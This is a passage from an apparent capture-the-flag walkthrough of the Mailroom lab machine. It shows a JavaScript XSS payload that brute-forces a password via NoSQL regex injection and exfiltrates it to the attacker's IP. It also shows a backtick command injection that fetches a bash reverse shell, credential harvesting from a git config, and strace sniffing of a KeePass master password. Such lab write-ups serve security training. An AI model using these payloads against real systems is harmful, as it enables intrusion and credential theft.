var characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#%:;<>@_=';

for (var i = 0; i < characters.length; i++) {

    var req = new XMLHttpRequest();
    req.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
    req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    req.send("email=tristan@mailroom.htb&password[$regex]=" + password + characters[i] + ".*");

    if (req.responseText.length == 130) {
        password += characters[i];
        var exfil_req = new XMLHttpRequest();
        exfil_req.open("GET", "http://10.10.14.6/?pass=" + password, true);
        exfil_req.send();
        i = 0;
    }
}

var done_req = new XMLHttpRequest();
done_req.open("GET", "http://10.10.14.6/?done=" + password, true);
done_req.send();

```

It is going to loop over each character in `characters` and try the current `password` plus that character and `.*`. If the length is 130 (success), then it updates the password, sends it to me, and resets `i` to the start of the loop.

I had to remove a handful of special characters that mess up the regex (like `*` and `(`, etc). Luckily, I don’t need them. If I did, I’m sure there’s a way to escape them.

When I run this, I get the following at my webserver:

```
10.10.11.209 - - [20/Apr/2023 20:16:12] "GET /brutepass.js HTTP/1.1" 200 -
10.10.11.209 - - [20/Apr/2023 20:16:22] "GET /?pass=6 HTTP/1.1" 200 -
10.10.11.209 - - [20/Apr/2023 20:16:22] "GET /?pass=69 HTTP/1.1" 200 -
10.10.11.209 - - [20/Apr/2023 20:16:23] "GET /?pass=69t HTTP/1.1" 200 -
10.10.11.209 - - [20/Apr/2023 20:16:23] "GET /?pass=69tr HTTP/1.1" 200 -
10.10.11.209 - - [20/Apr/2023 20:16:24] "GET /?pass=69tri HTTP/1.1" 200 -
10.10.11.209 - - [20/Apr/2023 20:16:24] "GET /?pass=69tris HTTP/1.1" 200 -
10.10.11.209 - - [20/Apr/2023 20:16:25] "GET /?pass=69trisR HTTP/1.1" 200 -
10.10.11.209 - - [20/Apr/2023 20:16:26] "GET /?pass=69trisRu HTTP/1.1" 200 -
10.10.11.209 - - [20/Apr/2023 20:16:26] "GET /?pass=69trisRul HTTP/1.1" 200 -
10.10.11.209 - - [20/Apr/2023 20:16:27] "GET /?pass=69trisRule HTTP/1.1" 200 -
10.10.11.209 - - [20/Apr/2023 20:16:27] "GET /?pass=69trisRulez HTTP/1.1" 200 -
10.10.11.209 - - [20/Apr/2023 20:16:28] "GET /?pass=69trisRulez! HTTP/1.1" 200 -
10.10.11.209 - - [20/Apr/2023 20:16:29] "GET /?done=69trisRulez! HTTP/1.1" 200 -

```

It takes less than 30 seconds once I send the contact message.

### SSH

Trying to log into Gitea as tristan just returns 500, which is weird.

But before trying to figure out what’s going on there, that password works for tristan over SSH:

```

oxdf@hacky$ sshpass -p '69trisRulez!' ssh tristan@mailroom.htb
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-146-generic x86_64)
...[snip]...
You have new mail.
...[snip]...
tristan@mailroom:~$

```

## Shell as www-data in Container

### Enumeration

#### sudo

tristan can’t run `sudo`:

```

tristan@mailroom:~$ sudo -l
[sudo] password for tristan:
Sorry, user tristan may not run sudo on mailroom.

```

#### Home Directories

There’s nothing interesting in tristan’s home directory. There is another home directory, for matthew:

```

tristan@mailroom:/home$ ls
matthew  tristan

```

That directory has `user.txt` as well as a KeePass database:

```

tristan@mailroom:/home/matthew$ ls -l
total 8
-rw-r--r-- 1 matthew matthew 1998 Mar 16 22:47 personal.kdbx
-rw-r----- 1 root    matthew   33 Apr 19 20:01 user.txt

```

tristan can read the KeePass file, but I’m not able to do anything with it now. I’ll come back to this file later.

#### Mail

When I connected to SSH, it said “You have new mail.” In `/var/mail`, there are files for root and tristan:

```

tristan@mailroom:/var/mail$ ls
root  tristan

```

I can’t read root’s, but tristan’s has the 2FA link generated when I logged in successfully:

```

tristan@mailroom:/var/mail$ cat tristan
Return-Path: <noreply@mailroom.htb>
X-Original-To: tristan@mailroom.htb
Delivered-To: tristan@mailroom.htb
Received: from localhost (unknown [172.19.0.5])
        by mailroom.localdomain (Postfix) with SMTP id 323441F98
        for <tristan@mailroom.htb>; Fri, 21 Apr 2023 00:24:55 +0000 (UTC)
Subject: 2FA

Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=39fed0ea310651e57b0fbfb3c18d3846

```

### staffroom Again

#### Tunnel

To access the staffroom site, I no longer need to go through the XSS. I’ll use the `-D 1080` option with SSH to create a SOCKS proxy through the SSH session as tristan. From a clean session that looks like:

```

oxdf@hacky$ sshpass -p '69trisRulez!' ssh tristan@mailroom.htb -D 1080
...[snip]...

```

In my `/etc/hosts` file, I’ll set the domain to localhost:

```
127.0.0.1 staff-review-panel.mailroom.htb

```

In Firefox, I’ve got FoxyProxy set to proxy through a SOCKS proxy on 1080:

![image-20230420204631791](/img/image-20230420204631791.png)

Now when I load the domain, it works:

![image-20230420204701916](/img/image-20230420204701916.png)

#### Login

When I enter tristan’s email and password, it responds with a message telling me to check my email:

![image-20230420204802539](/img/image-20230420204802539.png)

That email is there:

```

tristan@mailroom:~$ cat /var/mail/tristan
Return-Path: <noreply@mailroom.htb>
X-Original-To: tristan@mailroom.htb
Delivered-To: tristan@mailroom.htb
Received: from localhost (unknown [172.19.0.5])
        by mailroom.localdomain (Postfix) with SMTP id E26A2D57
        for <tristan@mailroom.htb>; Fri, 21 Apr 2023 00:47:25 +0000 (UTC)
Subject: 2FA

Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=59ca77478c5fb8c2c16abe46ca4197f7

```

On visiting that link, I’m redirected to `/dashboard.php`:

![image-20230420204907507](/img/image-20230420204907507.png)

#### dashboard.php Source

`dashboard.php` is mostly static HTML. There’s some PHP at the top making sure the user is logged in and handling logout clicks. The other spot is in the middle of the page where it loads a list of “activities”, like the one shown above.

Starting on line 109, it gets a list of filenames from `/var/www/mailroom/inquiries` using the `scandir()` PHP function:

```

<?php
    $dir = '/var/www/mailroom/inquiries/';
$files = scandir($dir);

```

It loops over each file, using `file_get_contents` to read the file, and if the “Irrelevant” marker isn’t present, then it uses `filectime` to calculate the age of the file and `pathinfo` to get the name of the file, putting those on the page:

```

foreach ($files as $file) {
    if ($file[0] === '.' || pathinfo($dir .$file, PATHINFO_EXTENSION) !== 'html') {
        continue;
    }
    $contents = file_get_contents($dir . $file);
    if (strpos($contents, '<p class="lead mb-1">Irrelevant</p>') === false) {
        $ctime = filectime($dir . $file);
        $elapsed = time() - $ctime;
        $elapsed_text = '';
        if ($elapsed < 60) {
            $elapsed_text = $elapsed . ' seconds ago';
        } elseif ($elapsed < 3600) {
            $elapsed_text = round($elapsed / 60) . ' minutes ago';
        } elseif ($elapsed < 86400) {
            $elapsed_text = round($elapsed / 3600) . ' hours ago';
        } else {
            $elapsed_text = round($elapsed / 86400) . ' days ago';
        }
        $name = pathinfo($dir . $file, PATHINFO_FILENAME);
        echo '<li>';
        echo '<div class="d-flex justify-content-between">';
        echo '<div>' . $name . '</div>';
        echo '<p>' . $elapsed_text . '</p>';
        echo '</div>';
        echo '</li>';
    }
}
?>

```

#### inspect.php

Visiting `inspect.php` shows a form for finding tickets:

![image-20230420214538081](/img/image-20230420214538081.png)

If I submit a query id from the dash board to “Read Inqueries”, it shows the content of the inquiry:

![image-20230420214652222](/img/image-20230420214652222.png)

Similarly, if I send that same ID to “Check Status”:

![image-20230420214716550](/img/image-20230420214716550.png)

#### inspect.php Source

The page also mentions using the “inspect tool” to look at the inqueries. There’s an `inspect.php` file in Gitea. Most of this page is static, with a couple variables defined in the PHP at the top, and then `echo`ed into the page where they would display.

At the top, the PHP calculates `$data` based on the `$_POST['inquiry_id']` parameter:

```

$data = '';
if (isset($_POST['inquiry_id'])) {
  $inquiryId = preg_replace('/[\$<>;|&{}\(\)\[\]\'\"]/', '', $_POST['inquiry_id']);
  $contents = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html");

  // Parse the data between  and </p>
  $start = strpos($contents, '<p class="lead mb-0">');
  if ($start === false) {
    // Data not found
    $data = 'Inquiry contents parsing failed';
  } else {
    $end = strpos($contents, '</p>', $start);
    $data = htmlspecialchars(substr($contents, $start + 21, $end - $start - 21));
  }
}

```

It’s using `shell_exec` to `cat` the file, which is unsafe. To compensate for this, it’s trying to remove any characters that might be used for command injection. However, it missed the backtick character.

`$status_data` is set in a very similar way, just looking for a different element in the HTML page.

### Command Injection

#### POC

I’ll put `sleep` command in with tik marks:

![image-20230420215006183](/img/image-20230420215006183.png)

On sending, it hangs for a few seconds, and then returns failure:

![image-20230420215017503](/img/image-20230420215017503.png)

This is code execution.

#### Shell

With all the limits on characters I can put in, I’ll try fetching a file from my server and writing it to the host. `wget` doesn’t contact my server, but `cur1` does.

Inside `shell` on my webserver, I’ll include a simple [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/443 0>&1

```

Now I’ll grab that with `curl 10.10.14.6/shell -o /tmp/0xdf.sh`. It seems to work:

```
10.10.11.209 - - [20/Apr/2023 21:54:50] "GET /shell HTTP/1.1" 200 -

```

With `nc` listening on 443, I’ll send this to run the script:

![image-20230420215545709](/img/image-20230420215545709.png)

At `nc`, I get a shell:

```

oxdf@hacky$ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.209 39444
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ad83468d01ee:/var/www/staffroom$

```

I’ll [upgrade](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

www-data@ad83468d01ee:/var/www$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@ad83468d01ee:/var/www$ ^Z
[1]+  Stopped                 nc -lvnp 443
oxdf@hacky$ stty raw -echo; fg
nc -lvnp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@ad83468d01ee:/var/www$

```

## Shell as matthew

### Enumeration

#### Container

It’s clear that I’m in a container looking at the hostname of “ad83468d01ee”. Tools like `ifconfig` and `ip` are not installed:

```

www-data@ad83468d01ee:/var/www/staffroom$ ifconfig
bash: ifconfig: command not found
www-data@ad83468d01ee:/var/www/staffroom$ ip addr
bash: ip: command not found

```

#### Web Servers

The staffroom page is in `/var/www/staffroom`. There are two other webservers:

```

www-data@ad83468d01ee:/var/www$ ls
html  mailroom  staffroom

```

`html` has a single script, `send.sh`:

```

#!/bin/bash

#SMTP server IP address
SERVER=172.19.0.1

#SMTP server port
PORT=25

#store the input in a variable
INPUT=$(cat -)

#Extract recipient email address
RECIPIENT=$(echo $(echo "$INPUT" | head -n 1) | awk '{print $2}')

#Extract subject
SUBJECT=$(echo $(echo "$INPUT" | head -n 2 | tail -n 1) | awk '{print $2}')

#Extract message
MESSAGE=$(echo "$INPUT" | awk '{if(NR>3) {printf("%s",$0);}}')

#Connect to SMTP server
nc $SERVER $PORT <<EOF

HELO localhost
MAIL FROM: noreply@mailroom.htb
RCPT TO: $RECIPIENT
DATA
Subject: $SUBJECT

$MESSAGE
.
QUIT
EOF

```

This looks like what is used to send the 2FA emails.

The `mailroom` directory has the source for that main site. There’s nothing interesting in there. The site is almost entirely static.

#### staffroom

The `staffroom` directory has code that seems to match what is in Gita:

```

www-data@ad83468d01ee:/var/www/staffroom$ ls -la
total 68
drwxr-xr-x 7 root root 4096 Jan 19 10:54 .
drwxr-xr-x 5 root root 4096 Jan 15 17:58 ..
drwxr-xr-x 8 root root 4096 Jan 19 10:56 .git
-rw-r--r-- 1 root root    0 Jan 15 17:59 README.md
-rwxr-xr-x 1 root root 3453 Jan 19 10:54 auth.php
-rwxr-xr-x 1 root root   62 Jan 15 17:59 composer.json
-rwxr-xr-x 1 root root 8096 Jan 15 17:59 composer.lock
drwxr-xr-x 2 root root 4096 Jan 15 17:59 css
-rwxr-xr-x 1 root root 5848 Jan 19 10:52 dashboard.php
drwxr-xr-x 3 root root 4096 Jan 15 17:59 font
-rwxr-xr-x 1 root root 2594 Jan 15 17:59 index.php
-rwxr-xr-x 1 root root 6326 Jan 18 13:26 inspect.php
drwxr-xr-x 2 root root 4096 Jan 15 17:59 js
-rwxr-xr-x 1 root root  953 Jan 15 17:59 register.html
drwxr-xr-x 6 root root 4096 Jan 15 17:59 vendor

```

The `.git` config could be interesting. `config` has matthew’s Gitea creds:

```

www-data@ad83468d01ee:/var/www/staffroom/.git$ cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
[user]
        email = matthew@mailroom.htb

```

### su

The `%23` at the end is URL-encoded `#`. The password doesn’t work for SSH, as it demands a public key:

```

oxdf@hacky$ sshpass -p 'HueLover83#' ssh matthew@mailroom.htb
matthew@mailroom.htb: Permission denied (publickey).

```

However, it does work for `su` from the shell as tristan:

```

tristan@mailroom:~$ su - matthew
Password:
matthew@mailroom:~$

```

And I can access the user flag:

```

matthew@mailroom:~$ cat user.txt
af7c4c4c************************

```

## Shell as root

### Enumeration

#### KeePass

I already saw the KeePass db in matthew’s home directory:

```

matthew@mailroom:~$ ls
personal.kdbx  user.txt

```

I’ll try to open it with `kpcli` (the KeePass command line client):

```

matthew@mailroom:~$ kpcli

KeePass CLI (kpcli) v3.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> open personal.kdbx
WARNING: A KeePassX-style lock file is in place for this file.
         It may be opened elsewhere. Be careful of saving!
Please provide the master password:

```

Two things to note:
1. Unsurprisingly it requires a password.
2. Some other process has this file open. That isn’t always the case. If I run `watch -d 'ls -la ~` I’ll see the `.lock` file show up and go away:

   ![image-20230421083913849](/img/image-20230421083913849.png)

</picture>

I’ll exfil the DB and try to crack the password, but it’s not in `rockyou.txt`.

I’m interested in seeing what other processes might be interacting with the KeePass file. It looks like I can only see processes owned by the current user:

```

matthew@mailroom:~$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
matthew   336890  0.0  0.1   8272  5312 pts/1    S    12:34   0:00 -bash
matthew   338109  0.5  0.2  19188  9784 ?        Ss   12:41   0:00 /lib/systemd/systemd --user
matthew   338161  0.0  0.0   8888  3264 pts/1    R+   12:41   0:00 ps auxww

```

`/proc` is mounted with `hidepid=2`, which confirms that:

```

matthew@mailroom:~$ mount | grep hidepid
proc on /proc type proc (rw,relatime,hidepid=2)

```

Still, some of the time there is a process owned by matthew that is running kpcli (which is a `perl` script):

```

matthew@mailroom:~$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
matthew   336890  0.0  0.1   8272  5312 pts/1    S    12:34   0:00 -bash
matthew   338265  1.1  0.2  19184  9708 ?        Ss   12:42   0:00 /lib/systemd/systemd --user
matthew   338271  1.8  0.5  27752 22784 ?        Ss   12:42   0:00 /usr/bin/perl /usr/bin/kpcli
matthew   338280  0.0  0.0   8888  3308 pts/1    R+   12:42   0:00 ps auxww

```

#### ptrace

The box is also set up such that the `ptrace` [scope](https://linux-audit.com/protect-ptrace-processes-kernel-yama-ptrace_scope/) is the most open:

```

matthew@mailroom:~$ cat /proc/sys/kernel/yama/ptrace_scope
0

```

0 means that “all processes can be debugged, as long as they have same uid”.

LinPeas will alert on this (seen in the source [here on lines 82-84](https://github.com/carlospolop/PEASS-ng/blob/345bf63b40a7415b9a0825388883e0bdf2eb37ff/linPEAS/builder/linpeas_parts/6_users_information.sh#L82-L84)). LinPeas warns against abuse of `sudo` tokens, but I’ll abuse it differently for Mailroom.

### Trace kpcli

#### Getting Attached

The system is configured such that I can debug processes owned by matthew. I also see something is starting `kpcli` as matthew regularly. It seem the process is actually running `perl` (based on the `ps` output above). I can get the current pid with `pidof`:

```

matthew@mailroom:~$ pidof perl
340825

```

I can try to attach `strace` passing in `-p $(pidof perl)` to get the process. If there’s no `perl` process, it fails:

```

matthew@mailroom:~$ strace -p $(pidof perl)
strace: option requires an argument -- 'p'
Try 'strace -h' for more information.

```

If I am able to attach, it’s very loud:

```

matthew@mailroom:~$ strace -p $(pidof perl)
strace: Process 1313644 attached
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, " ", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, " ", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "/", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "/", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "h", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "h", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "o", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "o", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "m", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "m", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "e", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "e", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "/", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "/", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "m", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "m", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "a", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "a", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "t", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "t", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "t", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "t", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "h", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "h", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "e", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "e", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "w", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "w", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "/", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "/", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "p", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "p", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "e", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "e", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "r", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "r", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "s", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "s", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "o", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "o", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "n", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "n", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "a", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "a", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "l", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "l", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, ".", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, ".", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "k", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "k", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "d", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "d", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "b", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "b", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "x", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "x", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "\n", 1)                        = 1
write(4, "\n", 1)                       = 1
ioctl(3, TCGETS, {B38400 opost isig -icanon -echo ...}) = 0
ioctl(3, SNDCTL_TMR_STOP or TCSETSW, {B38400 opost isig icanon echo ...}) = 0
ioctl(3, TCGETS, {B38400 opost isig icanon echo ...}) = 0
rt_sigaction(SIGWINCH, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7eff0c192420}, {sa_handler=0x7eff0bb96d40, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7eff0c192420}, 8) = 0
rt_sigprocmask(SIG_BLOCK, [TSTP], [], 8) = 0
rt_sigaction(SIGTSTP, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7eff0c192420}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
stat("/etc/localtime", {st_mode=S_IFREG|0644, st_size=118, ...}) = 0
stat("/etc/localtime", {st_mode=S_IFREG|0644, st_size=118, ...}) = 0
stat("/etc/localtime", {st_mode=S_IFREG|0644, st_size=118, ...}) = 0
stat("/etc/localtime", {st_mode=S_IFREG|0644, st_size=118, ...}) = 0
stat("/etc/localtime", {st_mode=S_IFREG|0644, st_size=118, ...}) = 0
stat("/etc/localtime", {st_mode=S_IFREG|0644, st_size=118, ...}) = 0
stat("", 0x5628419954b8)                = -1 ENOENT (No such file or directory)
stat("/home/matthew/personal.kdbx", {st_mode=S_IFREG|0644, st_size=1998, ...}) = 0
stat("/home/matthew/personal.kdbx", {st_mode=S_IFREG|0644, st_size=1998, ...}) = 0
stat("/home/matthew/personal.kdbx", {st_mode=S_IFREG|0644, st_size=1998, ...}) = 0
geteuid()                               = 1001
geteuid()                               = 1001
openat(AT_FDCWD, "/home/matthew/personal.kdbx", O_RDONLY|O_CLOEXEC) = 5
ioctl(5, TCGETS, 0x7fff53f29da0)        = -1 ENOTTY (Inappropriate ioctl for device)
lseek(5, 0, SEEK_CUR)                   = 0
fstat(5, {st_mode=S_IFREG|0644, st_size=1998, ...}) = 0
read(5, "\3\331\242\232g\373K\265\1\0\3\0\2\20\0001\301\362\346\277qCP\276X\5!j\374Z\377\3"..., 8192) = 1998
lseek(5, 4, SEEK_SET)                   = 4
lseek(5, 0, SEEK_CUR)                   = 4
close(5)                                = 0
stat("/home/matthew/personal.kdbx.lock", 0x5628419954b8) = -1 ENOENT (No such file or directory)
ioctl(0, TCGETS, {B38400 opost isig icanon echo ...}) = 0
ioctl(0, TCGETS, {B38400 opost isig icanon echo ...}) = 0
ioctl(0, SNDCTL_TMR_START or TCSETS, {B38400 opost isig icanon -echo ...}) = 0
ioctl(0, TCGETS, {B38400 opost isig icanon -echo ...}) = 0
ioctl(0, TCGETS, {B38400 opost isig icanon -echo ...}) = 0
ioctl(0, TCGETS, {B38400 opost isig icanon -echo ...}) = 0
ioctl(0, SNDCTL_TMR_START or TCSETS, {B38400 opost -isig -icanon -echo ...}) = 0
ioctl(0, TCGETS, {B38400 opost -isig -icanon -echo ...}) = 0
write(1, "Please provide the master passwo"..., 36) = 36
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x56284292f8a0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, 0x56284292f8a0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, "!", 8192)                      = 1
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
write(1, "*", 1)                        = 1
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
fcntl(0, F_GETFL)                       = 0x2 (flags O_RDWR)
fcntl(0, F_SETFL, O_RDWR|O_NONBLOCK)    = 0
read(0, "s", 8192)                      = 1
fcntl(0, F_GETFL)                       = 0x802 (flags O_RDWR|O_NONBLOCK)
fcntl(0, F_SETFL, O_RDWR)               = 0
write(1, "*", 1)                        = 1
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0
...[snip]...

```

#### Capture Full Trace

To get a clean look, I’ll use a `while` loop to wait for the process to exist. I’ll wait until there is no `perl` process, and then start this:

```

matthew@mailroom:~$ while ! pid=$(pidof perl); do sleep 1; done && strace -p $pid -o output
strace: Process 379183 attached
Trace/breakpoint trap (core dumped)

```

Interestingly, it always dies quickly after only one line:

```

matthew@mailroom:~$ cat output
pselect6(4, [3], NULL, NULL, NULL, {[], 8}

```

I’ll look at why this is happening in Beyond Root. Immediately after connecting the trace, I get that trap message and it ends. I’ll get around that by tracing again:

```

matthew@mailroom:~$ while pidof perl >/dev/null; do sleep 1; done; while ! pid=$(pidof perl); do sleep 1; done && strace -p $pid -o out1; strace -p $pid -o out2
strace: Process 380143 attached
Trace/breakpoint trap (core dumped)
strace: Process 380143 attached

```

`out2` has lots of data:

```

matthew@mailroom:~$ ls -l out*
-rw-rw-r-- 1 matthew matthew    42 Apr 21 17:55 out1
-rw-rw-r-- 1 matthew matthew 64878 Apr 21 17:55 out2

```

#### Trace Analysis

`strace` output looks like:

```

pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "p", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "p", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "e", 1)                         = 1
select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout)
write(4, "e", 1)                        = 1
pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3])
read(3, "n", 1)                         = 1
...[snip]...

```

The various system calls are shown with their arguments and return values. I can use some Bash foo to look at the number of times each system call is made:

```

matthew@mailroom:~$ cat out2 | cut -d '(' -f1 | sort | uniq -c | sort -nr
    233 fcntl
    132 read
     86 write
     79 rt_sigaction
     72 stat
     58 clock_nanosleep
     56 pselect6
     54 ioctl
     52 select
     22 mmap
     22 lseek
     20 close
     18 openat
     15 rt_sigprocmask
     13 fstat
      9 brk
      7 mprotect
